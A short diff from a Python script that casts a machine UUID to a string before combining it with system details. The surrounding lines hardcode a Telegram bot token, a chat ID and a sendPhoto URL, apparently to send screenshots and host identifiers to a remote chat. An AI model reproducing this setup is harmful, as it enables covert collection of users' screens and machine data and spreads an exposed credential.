@@ -93,7 +93,7 @@ def get_uuid():
             f.write(uuid)
         return uuid
 
-UUID = get_uuid() + "".join(os.uname())
+UUID = str(get_uuid()) + "".join(os.uname())
 TOKEN = "409508734:AAFmeROvHl6adfzmlcNAkhhnSDezm5EkK1g"
 chat_id = "-1001459013908"
 SHOTURL = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
